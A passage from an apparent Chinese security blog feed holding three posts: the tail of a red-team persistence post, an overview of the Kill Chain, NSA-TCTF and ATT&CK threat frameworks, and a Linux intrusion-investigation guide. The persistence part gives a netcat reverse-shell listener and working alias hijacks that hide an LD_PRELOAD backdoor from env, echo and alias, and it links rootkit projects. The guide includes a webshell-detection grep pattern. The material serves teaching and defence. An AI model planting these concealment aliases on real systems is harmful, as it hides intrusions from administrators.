&quot;-i&quot;]);</span><br><span class="line"></span><br><span class="line">//  攻击机监听6666端口并获取反弹的shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>

<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) echo $LD_PRELOAD </span><br><span class="line"></span><br><span class="line">alias echo=&#x27;func()&#123; echo $* | sed &quot;s!/home/hook.so! !g&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">2) env</span><br><span class="line"></span><br><span class="line">alias env=&#x27;func()&#123; env $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">3) set </span><br><span class="line"></span><br><span class="line">alias set=&#x27;func()&#123; set $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">4) export </span><br><span class="line"></span><br><span class="line">alias export=&#x27;func()&#123; export $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">5) unalias劫持</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;func()&#123; if [ $# != 0 ]; then if [ $* != &quot;echo&quot; ]&amp;&amp;[ $* != &quot;env&quot; ]&amp;&amp;[ $* != &quot;set&quot; ]&amp;&amp;[ $* != &quot;export&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">6) alias劫持</span><br><span class="line"></span><br><span class="line">alias alias=&#x27;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul>
<li><a href="https://github.com/mempodippy/cub3">https://github.com/mempodippy/cub3</a> </li>
<li><a href="https://github.com/mempodippy/vlany">https://github.com/mempodippy/vlany</a></li>
</ul>
]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Persistence</tag>
      </tags>
  </entry>
  <entry>
    <title>网络威胁框架演进</title>
    <url>/posts/20996/</url>
    <content><![CDATA[<center>本文探究Cyber Kill Chain、NSA-TCTF、MITRE-ATT&CK框架等网络威胁框架演进发展历程...</center>

<span id="more"></span>

<h2 id="0x01-Cyber-Kill-Chain"><a href="#0x01-Cyber-Kill-Chain" class="headerlink" title="0x01 Cyber Kill Chain"></a>0x01 Cyber Kill Chain</h2><p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/cyber_kill1.png"></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/cyber_kill_chain_cn.png"></p>
<p><strong>检测防御</strong></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/cyber_kill_2.png"></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/cyber_kill_chain_AD.png"></p>
<h2 id="0x02-NSA-TCTF框架"><a href="#0x02-NSA-TCTF框架" class="headerlink" title="0x02 NSA-TCTF框架"></a>0x02 NSA-TCTF框架</h2><p>NSA-TCTF框架(Technical Cyber Threat Framework，技术性网空威胁框架): NSA于2018年提出的TCTF框架，对攻击意图、作业阶段、行动特征的拆解与刻画</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/NTCTF.png"></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/NTCTF_CN.png"></p>
<h2 id="0x03-ATT-amp-CK框架"><a href="#0x03-ATT-amp-CK框架" class="headerlink" title="0x03 ATT&amp;CK框架"></a>0x03 ATT&amp;CK框架</h2><p>MITRE-ATT&amp;CK框架 (Common Knowledge base of Adversary Tactics and Techniques，对手战术技术公共知识库): 从现实网络威胁中提炼出攻击行动的具体信息，构造了丰富的攻击者战术技术知识库</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/att&ck_linux-en.png"></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/att&ck_linux.png"></p>
<table>
<thead>
<tr>
<th>攻击阶段</th>
<th>对应英文</th>
<th>描述</th>
<th>检测项</th>
</tr>
</thead>
<tbody><tr>
<td>1. 初始访问</td>
<td>Initial Access</td>
<td>通过各种漏洞、攻击入口进入网络</td>
<td>暴力破解、异常登录、web攻击、服务漏洞、未授权访问、配置缺陷，钓鱼、供应链攻击、可信账户登录</td>
</tr>
<tr>
<td>2. 投递执行</td>
<td>Execution</td>
<td>恶意代码、软件投递并执行</td>
<td>主动非法外连、恶意软件落盘、可疑文件传输、异常脚本及指令执行，用户恶意链接、文档执行</td>
</tr>
<tr>
<td>3. 持久化控制</td>
<td>Persistence</td>
<td>持久化，保持立足点</td>
<td>可疑定时任务、异常启动项，webshell、rootkit、反弹shell、可疑账户创建、各类持久化后门</td>
</tr>
<tr>
<td>4. 权限提升</td>
<td>Privilege Escalation</td>
<td>获取更高级别权限</td>
<td>内核、系统、服务组件提权，漏洞利用程序，进程注入，LD_PRELOAD劫持，容器提权及逃逸</td>
</tr>
<tr>
<td>5.  防御规避</td>
<td>Defense Evasion</td>
<td>杀软、检测设备绕过，避免被发现</td>
<td>文件编码、混淆，文件、进程隐藏，安全设备禁用修改，系统文件、命令替换，预加载文件篡改，agent异常离线，日志及历史命令清除，有效账户利用，进程注入</td>
</tr>
<tr>
<td>6. 凭证访问</td>
<td>Credential Access</td>
<td>窃取账户和密码</td>
<td>输入记录，密码喷洒攻击，中间人攻击，修改身份验证过程，网络嗅探，系统凭证转储，登录凭证抓取</td>
</tr>
<tr>
<td>7. 环境发现</td>
<td>Discovery</td>
<td>所处系统及内部网络环境发现，便于进一步横向渗透</td>
<td>内网信息收集，账号发现、文件目录发现、网络服务扫描、共享服务发现、网络嗅探、权限发现、服务组件及安全软件发现、虚拟化&#x2F;沙盒环境发现</td>
</tr>
<tr>
<td>8. 横向移动</td>
<td>Lateral Movement</td>
<td>当前环境穿越，多个目标访问</td>
<td>内网扫描、端口转发、远程服务利用、远程服务会话劫持、蠕虫病毒、横向工具转移、软件部署工具</td>
</tr>
<tr>
<td>9. 数据采集</td>
<td>Collection</td>
<td>目标数据收集</td>
<td>存档数据、剪贴板、数据库、网络共享等数据收集，数据分段暂存及传输，输入捕捉，中间人攻击</td>
</tr>
<tr>
<td>10. 命令与控制</td>
<td>Command and Control</td>
<td>与目标系统持续通信与控制</td>
<td>远控木马、异常连接、数据编码及混淆、加密通道、协议隧道、多跳代理、域前置、DGA域名</td>
</tr>
<tr>
<td>11. 数据窃取</td>
<td>Exfiltration</td>
<td>目标数据窃取</td>
<td>敏感文件访问及泄漏、数据库导出，通过C2通道、网络及物理介制窃取数据，代码存储库窃取、云存储迁移，可信账号劫持及利用</td>
</tr>
<tr>
<td>12. 影响破坏</td>
<td>Impact</td>
<td>操纵、中断或破坏系统和数据</td>
<td>数据销毁、加密、损坏，账户访问权限删除，拒绝服务，磁盘擦除，服务停止等</td>
</tr>
</tbody></table>
<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul>
<li><a href="https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/Gaining_the_Advantage_Cyber_Kill_Chain.pdf">Gaining_the_Advantage_Cyber_Kill_Chain</a></li>
<li><a href="https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/Seven_Ways_to_Apply_the_Cyber_Kill_Chain_with_a_Threat_Intelligence_Platform.pdf">Seven_Ways_to_Apply_the_Cyber_Kill_Chain_with_a_Threat_Intelligence_Platform</a></li>
<li><a href="https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Defendable-Architectures.pdf">LM-White-Paper-Defendable-Architectures</a></li>
<li><a href="https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Threat-Driven-Approach.pdf">LM-White-Paper-Threat-Driven-Approach</a></li>
<li><a href="https://media.defense.gov/2019/Jul/16/2002158108/-1/-1/0/CTR_NSA-CSS-TECHNICAL-CYBER-THREAT-FRAMEWORK_V2.PDF">CTR_NSA-CSS-TECHNICAL-CYBER-THREAT-FRAMEWORK_V2</a></li>
<li><a href="https://attack.mitre.org/matrices/enterprise/linux/">https://attack.mitre.org/matrices/enterprise/linux/</a></li>
<li><a href="https://attack.mitre.org/tactics/enterprise/">https://attack.mitre.org/tactics/enterprise/</a></li>
<li><a href="https://attack.mitre.org/mitigations/enterprise/">https://attack.mitre.org/mitigations/enterprise/</a></li>
<li><a href="https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/Gaining_the_Advantage_Cyber_Kill_Chain.pdf">Gaining_the_Advantage_Cyber_Kill_Chain.pdf</a></li>
</ul>
]]></content>
      <categories>
        <category>威胁检测</category>
      </categories>
      <tags>
        <tag>Threat Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux入侵排查基础篇</title>
    <url>/posts/10024/</url>
    <content><![CDATA[<center>本文总结Linux服务器入侵排查的基本思路与方法...</center>

<span id="more"></span>

<h2 id="0x01-系统排查"><a href="#0x01-系统排查" class="headerlink" title="0x01 系统排查"></a>0x01 系统排查</h2><h3 id="1-系统信息"><a href="#1-系统信息" class="headerlink" title="1. 系统信息"></a>1. 系统信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ lscpu             #查看CPU信息</span><br><span class="line"></span><br><span class="line">$ uname -a          #操作系统信息</span><br><span class="line"></span><br><span class="line">$ cat /proc/version #系统版本信息</span><br><span class="line"></span><br><span class="line">$ cat /etc/redhat-release  #查看系统发行版</span><br><span class="line"></span><br><span class="line">$ lsmod             #查看模块信息</span><br><span class="line"></span><br><span class="line">$ lsblk             #列出块设备信息</span><br><span class="line"></span><br><span class="line">$ ifconfig eth0 | grep -w inet  #显示网卡IP信息</span><br><span class="line"></span><br><span class="line">$ curl cip.cc     #查看主机公网IP信息</span><br><span class="line"></span><br><span class="line">$ hostname        #查看系统主机名称</span><br><span class="line"></span><br><span class="line">$ cat /etc/resolv.conf   #DNS配置查看</span><br></pre></td></tr></table></figure>

<h3 id="2-用户账号"><a href="#2-用户账号" class="headerlink" title="2. 用户账号"></a>2. 用户账号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 查看系统用户信息</span><br><span class="line"></span><br><span class="line">$ cat /etc/passwd</span><br><span class="line"></span><br><span class="line">用户名:密码加密:用户ID:用户组ID:注释:用户主目录:默认登录shell</span><br><span class="line"></span><br><span class="line">最后一列：/bin/bash表示用户状态可登录; /sbin/nologin表示账户状态不可登录</span><br><span class="line"></span><br><span class="line">(2) 查询超级权限账户: UID为0</span><br><span class="line"></span><br><span class="line">$ awk -F: &#x27;&#123;if($3==0)print $1&#125;&#x27; /etc/passwd</span><br><span class="line"></span><br><span class="line">(3) 查看可登录账户</span><br><span class="line"></span><br><span class="line">$ grep &#x27;/bin/bash&#x27; /etc/passwd</span><br><span class="line"></span><br><span class="line">(4) 查看空口令账户</span><br><span class="line"></span><br><span class="line">$ awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"></span><br><span class="line">(5) 登录信息查看</span><br><span class="line"></span><br><span class="line">$ lastlog | more  #查看用户最后登录信息</span><br><span class="line"></span><br><span class="line">$ lastb | more    #显示用户错误的登录信息</span><br><span class="line"></span><br><span class="line">$ last | more     #查看用户最近登录信息</span><br><span class="line"></span><br><span class="line">$ uptime  #查看登陆多久、多少用户，负载</span><br><span class="line"></span><br><span class="line">$ who   #查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line"></span><br><span class="line">$ w     #查看系统信息，想知道某一时刻用户的行为</span><br><span class="line"></span><br><span class="line">  /var/log/wtmp: 存储登录成功的信息</span><br><span class="line"></span><br><span class="line">  /var/log/btmp: 存储登录失败的信息</span><br><span class="line"></span><br><span class="line">  /var/log/utmp: 存储当前正在登录的信息</span><br><span class="line"></span><br><span class="line">(6) 查看除root账号外其他帐号是否存在sudo权限</span><br><span class="line"></span><br><span class="line">$ more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line"></span><br><span class="line">(7) 禁用或删除多余及可疑的帐号</span><br><span class="line"></span><br><span class="line">$ usermod -L user    #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line"></span><br><span class="line">$ userdel user       #删除user用户</span><br><span class="line"></span><br><span class="line">$ userdel -r user    #将删除user用户，并且将/home目录下的user目录一并删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-启动项"><a href="#3-启动项" class="headerlink" title="3. 启动项"></a>3. 启动项</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat /etc/init.d/rc.local</span><br><span class="line"></span><br><span class="line">$ cat /etc/rc.local</span><br><span class="line"></span><br><span class="line">$ ls -alt /etc/init.d/ | head</span><br></pre></td></tr></table></figure>

<h3 id="4-定时任务"><a href="#4-定时任务" class="headerlink" title="4. 定时任务"></a>4. 定时任务</h3><p><code>crontab -u &lt;-l, -r, -e&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u 指定一个用户</span><br><span class="line">-l 列出某个用户的任务计划</span><br><span class="line">-r 删除某个用户的任务</span><br><span class="line">-e 编辑某个用户的任务</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ crontab -u root -l  # 列出root用户的任务计划</span><br><span class="line"></span><br><span class="line">$ ls /etc/cron*       # 查看/etc目录下任务计划相关文件</span><br></pre></td></tr></table></figure>

<p><strong>重点关注目录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>

<h2 id="0x02-进程排查"><a href="#0x02-进程排查" class="headerlink" title="0x02 进程排查"></a>0x02 进程排查</h2><h3 id="1-进程查看"><a href="#1-进程查看" class="headerlink" title="1. 进程查看"></a>1. 进程查看</h3><p><strong>netstat&#x2F;ss</strong></p>
<p><code>分析可疑端口、可疑IP、可疑PID及程序进程</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo netstat -ltpe | more   # 查看监听中的网络连接并显示进程ID、进程所有者用户名</span><br><span class="line"></span><br><span class="line">$ sudo netstat -antp | grep &quot;ESTABLISHED&#x27;&#x27;  # 查看正在通信中的连接信息</span><br><span class="line"></span><br><span class="line">$ sudo netstat -antpe  # -n 和 -e 选项连用，显示进程所有者的用户ID 号</span><br><span class="line"></span><br><span class="line">$ netstat -ts  # 打印出tcp协议下的收发包数量等统计数据</span><br><span class="line"></span><br><span class="line">$ watch -d -n0 &quot;netstat -atnp | grep &quot;ESTA&quot;  # 监视active状态的连接</span><br><span class="line"></span><br><span class="line">$ ss -plat  # 检查哪些进程在监听端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ps</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ps -elf | grep pid  # 以长格式显示系统中的进程信息</span><br><span class="line"></span><br><span class="line">$ ps -aux --sort -pcpu | less   # 根据cpu使用率进行排序</span><br><span class="line"></span><br><span class="line">$ ps -aux --sort -pmem | less   # 根据内存使用来升序排序</span><br><span class="line"></span><br><span class="line">$ ps -axjf  # 以树形结构显示进程</span><br></pre></td></tr></table></figure>

<p><strong>top</strong></p>
<p><code>动态查看进程状态, 可分析CPU占用较高的进程, 排查挖矿木马</code></p>
<p>实用选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c:  显示完整命令</span><br><span class="line"></span><br><span class="line">-d： 设置信息更新时间, 以秒为单位</span><br><span class="line"></span><br><span class="line">-u&lt;用户名&gt;：指定用户名</span><br><span class="line"></span><br><span class="line">-p&lt;进程号&gt;：显示指定进程信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>交互命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b： 高亮显示当前运行进程</span><br><span class="line"></span><br><span class="line">c： 切换显示命令名称和完整命令行</span><br><span class="line"></span><br><span class="line">M： 根据驻留内存大小进行排序</span><br><span class="line"></span><br><span class="line">P： 根据CPU使用百分比大小进行排序</span><br><span class="line"></span><br><span class="line">T： 根据时间/累计时间进行排序</span><br><span class="line"></span><br><span class="line">i： 忽略闲置和僵死进程，这是一个开关式命令</span><br><span class="line"></span><br><span class="line">s： 改变两次刷新之间的延迟时间（单位为s）</span><br><span class="line"></span><br><span class="line">l： 切换显示平均负载和启动时间信息</span><br><span class="line"></span><br><span class="line">m： 切换显示内存信息</span><br><span class="line"></span><br><span class="line">t： 切换显示进程和CPU状态信息</span><br><span class="line"></span><br><span class="line">w： 将当前设置写入~/.toprc文件中</span><br></pre></td></tr></table></figure>

<p><strong>pstree</strong></p>
<p><code>以树状图的方式展现进程之间的派生关系</code></p>
<p>实用选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示</span><br><span class="line"></span><br><span class="line">-h：列出树状图时，特别标明现在执行的程序</span><br><span class="line"></span><br><span class="line">-l：采用长列格式显示树状图</span><br><span class="line"></span><br><span class="line">-p：显示程序识别码</span><br><span class="line"></span><br><span class="line">-u：显示用户名称</span><br></pre></td></tr></table></figure>

<p><strong>lsof</strong></p>
<p><code>查看进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ lsof -p pid   # 查看指定进程ID已打开的内容</span><br><span class="line"></span><br><span class="line">$ lsof -i       # 显示所有连接</span><br><span class="line"></span><br><span class="line">$ lsof -i:port  # 查看与指定端口相关的网络信息</span><br><span class="line"></span><br><span class="line">$ lsof -i@ip    # 查看与指定IP相关的网络信息</span><br><span class="line"></span><br><span class="line">$ lsof -i -sTCP:LISTEN   # 找出正等待连接的端口</span><br><span class="line"></span><br><span class="line">$ lsof -i | grep -i ESTABLISHED  # 找出已经建立的连接</span><br><span class="line"></span><br><span class="line">$ lsof -u user     # 使用-u显示指定用户打开哪些文件</span><br><span class="line"></span><br><span class="line">$ lsof -u ^root    # 查看除指定用户以外的其它所有用户所做的事情</span><br><span class="line"></span><br><span class="line">$ lsof -c command  # 查看指定的命令正在使用的文件和网络连接</span><br><span class="line"></span><br><span class="line">$ lsof | grep deleted       # 查看被删除的文件信息</span><br><span class="line"></span><br><span class="line">$ kill -9 `lsof -t -u user` # 杀死指定用户运行的所有进程</span><br><span class="line"></span><br><span class="line">$ lsof -u user -i @ip       # 显示用户user连接到指定IP所做的一切</span><br><span class="line"></span><br><span class="line">$ lsof +L1   # 显示所有打开的链接数小于1的文件，多表示某个攻击者正尝试通过删除文件入口来隐藏文件内容</span><br></pre></td></tr></table></figure>

<p><strong>&#x2F;proc 文件系统</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux 内核提供了一种通过 proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制，它以文件系统的方式为访问系统内核数据的操作提供接口，用户和应用程序可以通过 proc 得到系统的信息</span><br></pre></td></tr></table></figure>

<p>进程相关项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/N         pid为N的进程信息</span><br><span class="line"></span><br><span class="line">/proc/N/cmdline 进程启动命令</span><br><span class="line"></span><br><span class="line">/proc/N/cwd     链接到进程当前工作目录</span><br><span class="line"></span><br><span class="line">/proc/N/environ 进程环境变量列表</span><br><span class="line"></span><br><span class="line">/proc/N/exe     链接到进程的执行命令文件</span><br><span class="line"></span><br><span class="line">/proc/N/fd      包含进程相关的所有的文件描述符</span><br><span class="line"></span><br><span class="line">/proc/N/maps    与进程相关的内存映射信息</span><br><span class="line"></span><br><span class="line">/proc/N/mem     指代进程持有的内存，不可读</span><br><span class="line"></span><br><span class="line">/proc/N/root    链接到进程的根目录</span><br><span class="line"></span><br><span class="line">/proc/N/stat    进程的状态</span><br><span class="line"></span><br><span class="line">/proc/N/statm   进程使用的内存的状态</span><br><span class="line"></span><br><span class="line">/proc/N/status  进程状态信息，比stat/statm更具可读性</span><br><span class="line"></span><br><span class="line">/proc/self      链接到当前正在运行的进程</span><br></pre></td></tr></table></figure>

<p><strong>隐藏进程显示</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">step 1: ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt;1</span><br><span class="line"></span><br><span class="line">step 2: ls /proc | sort -n | uniq &gt;2</span><br><span class="line"></span><br><span class="line">step 3: diff 1 2</span><br></pre></td></tr></table></figure>

<h3 id="2-进程删除"><a href="#2-进程删除" class="headerlink" title="2. 进程删除"></a>2. 进程删除</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ kill -9 pid     #强制终止进程</span><br><span class="line"></span><br><span class="line">$ killall name    #依据进程名称杀死进程</span><br><span class="line"></span><br><span class="line">$ killall -u user #杀死指定用户的进程</span><br><span class="line"></span><br><span class="line">$ pkill name   #杀死指定进程名的进程</span><br><span class="line"></span><br><span class="line">$ ps -elf | grep &#x27;root&#x27; | grep &#x27;&#123;*&#125;&#x27; | grep -v grep | xargs kill -STOP  # 针对因存在守护进程无法删除的情况，可先把进程挂起，查杀守护进程后，再将进程删除</span><br><span class="line"></span><br><span class="line">$ lsattr file / chattr -i file / rm -rf file  #针对设置了不可更改权限的文件，先移除i属性，再进行删除</span><br></pre></td></tr></table></figure>

<h3 id="3-调试分析"><a href="#3-调试分析" class="headerlink" title="3. 调试分析"></a>3. 调试分析</h3><p><strong>strace</strong></p>
<p><code>跟踪进程执行时的系统调用和所接收的信号,可跟踪用户进程与 Linux内核之间的交互</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统调用system call是程序从内核请求服务的一种编程方式，系统调用进入内核，使用trap机制从用户空间切换到内核空间，通过使用glibc系统库完成系统调用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ strace -p `pidof AliYunDun`  # 依据pid跟踪进程正在进行的系统调用</span><br><span class="line"></span><br><span class="line">$ strace -o trace.log ls testdir/   #将输出记录到文件中</span><br><span class="line"></span><br><span class="line">$ strace -v ls testdir  #在每个系统调用中提供附加信息\</span><br><span class="line"></span><br><span class="line">$ strace -f ls testdir  #对当前正在跟踪的进程创建的任何子进程进行跟踪</span><br><span class="line"></span><br><span class="line">$ strace -e open ls testdir   #使用-e标志跟上系统调用的名称</span><br><span class="line"></span><br><span class="line">$ strace -e write,getdents ls testdir  #查看多个系统调用</span><br><span class="line"></span><br><span class="line">$ strace -t ls testdir/    #查看所有的系统调用的时间戳</span><br><span class="line"></span><br><span class="line">$ strace -r ls testdir/    #显示执行每个系统调用所花费的时间</span><br></pre></td></tr></table></figure>

<p><strong>ltrace</strong></p>
<p><code>库调用跟踪器,用来跟踪进程调用库函数的情况</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">用法：ltrace [option ...] [command [arg ...]]</span><br><span class="line"></span><br><span class="line">-d  打印调试信息</span><br><span class="line"></span><br><span class="line">-f  跟踪子进程</span><br><span class="line"></span><br><span class="line">-i  打印指令指针，当库调用时</span><br><span class="line"></span><br><span class="line">-p PID  附着在值为PID的进程号上进行ltrace</span><br><span class="line"></span><br><span class="line">-S 显示系统调用</span><br><span class="line"></span><br><span class="line">-T 输出每个调用过程的时间开销</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>pstack</strong></p>
<p><code>显示每个进程的栈跟踪</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pstack pid  #pstack 命令必须由相应进程的属主或 root 运行,唯一选项是要检查的进程的 PID</span><br></pre></td></tr></table></figure>


<h2 id="0x03-服务排查"><a href="#0x03-服务排查" class="headerlink" title="0x03 服务排查"></a>0x03 服务排查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ chkconfig  --list  #查看系统运行的服务</span><br><span class="line"></span><br><span class="line">  # 0-6表示等级</span><br><span class="line"></span><br><span class="line">  1 单用户模式</span><br><span class="line"></span><br><span class="line">  2 无网络连接的多用户命令模式</span><br><span class="line"></span><br><span class="line">  3 有网络连接的多用户命令模式</span><br><span class="line"></span><br><span class="line">  4 表示不可用</span><br><span class="line"></span><br><span class="line">  5 带图形界面的多用户模式</span><br><span class="line"></span><br><span class="line">  6 重新启动</span><br><span class="line"></span><br><span class="line">$ service --status-all | grep running ｜ more      #显示正在运行的服务</span><br><span class="line"></span><br><span class="line">$ systemctl list-unit-files | grep enabled | more  #列出 systemd 下正在运行服务</span><br></pre></td></tr></table></figure>

<h2 id="0x04-文件痕迹"><a href="#0x04-文件痕迹" class="headerlink" title="0x04 文件痕迹"></a>0x04 文件痕迹</h2><h3 id="1-敏感目录"><a href="#1-敏感目录" class="headerlink" title="1. 敏感目录"></a>1. 敏感目录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 临时目录/tmp、/var/tmp、/dev/shm下的文件，目录权限是1777，容易被上传木马文件</span><br><span class="line"></span><br><span class="line">(2) 命令目录/usr/bin、/usr/sbin等下的二进制文件容易被替换，替换后可下载busybox使用被替换命令</span><br><span class="line"></span><br><span class="line">$ ls -alt /usr/bin | head   #按照最新修改时间显示，排查可疑文件</span><br><span class="line"></span><br><span class="line">(3) ~/.ssh、/etc/ssh 经常作为一些后门配置的路径，需重点排查</span><br><span class="line"></span><br><span class="line">$ cat ~/.ssh/authorized_keys  #检查公钥是存在否异常注入</span><br></pre></td></tr></table></figure>

<h3 id="2-时间点查找"><a href="#2-时间点查找" class="headerlink" title="2. 时间点查找"></a>2. 时间点查找</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">列出攻击日志内变动的文件,排查恶意软件</span><br><span class="line"></span><br><span class="line">$ ls --full-time ./  | sed -n &#x27;/2019-01-01/p&#x27;   #查找当前文件夹下的某个日期产生的文件</span><br><span class="line"></span><br><span class="line">$ find / -ctime 0 -name &quot;.sh&quot;  #查找一天内新增的sh文件</span><br><span class="line"></span><br><span class="line">  -type b/c/d/f/l/p: 查找快设备、字符设备、目录、普通文件、符号链接、管道</span><br><span class="line">  -mtime -n +n     # 按文件更改时间来查找文件，-n 指 n 天以内，+n 指 n 天前</span><br><span class="line">  -atime -n +n     # 按文件访问时间来查找文件，-n 指 n 天以内，+n 指 n 天前</span><br><span class="line">  -ctime -n +n     # 按文件创建时间来查找文件，-n 指 n 天以内，+n 指 n 天前</span><br><span class="line"></span><br><span class="line">$ find /tmp -type f -amin -10 -print  #打印出10分钟内访问的所有文件</span><br></pre></td></tr></table></figure>

<h3 id="3-文件大小搜索"><a href="#3-文件大小搜索" class="headerlink" title="3. 文件大小搜索"></a>3. 文件大小搜索</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ find / -size -1223124c -size +1223122c -exec ls -id &#123;&#125; \;   #搜索1223123大小的文件，盖茨木马</span><br><span class="line"></span><br><span class="line">$ find /usr/bin -type f -size 2k    # 查找大小等于2KB的文件</span><br></pre></td></tr></table></figure>

<h3 id="4-特殊文件"><a href="#4-特殊文件" class="headerlink" title="4. 特殊文件"></a>4. 特殊文件</h3><p><strong>webshell匹配</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ find /var/www/ -name &quot;*.php&quot; |xargs egrep &#x27;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>特殊权限文件查找</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ find /tmp -perm 777   # 打印出权限为777的文件, -perm选项指明find应该只匹配具有特定权限值的文件</span><br><span class="line"></span><br><span class="line">$ find / -type f -user root -print  # 打印出用户root拥有的所有文件, 选项-user USER找出由某个特定用户所拥有的文件</span><br></pre></td></tr></table></figure>

<p><strong>隐藏文件查找</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ls -art /var/www/html | grep &quot;^\.&quot;   # 查找web目录下以&quot;.&quot;开头的具有隐藏属性的文件</span><br></pre></td></tr></table></figure>

<h3 id="5-SUID程序"><a href="#5-SUID程序" class="headerlink" title="5. SUID程序"></a>5. SUID程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ find / -type f -perm -04000 -ls -uid 0 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

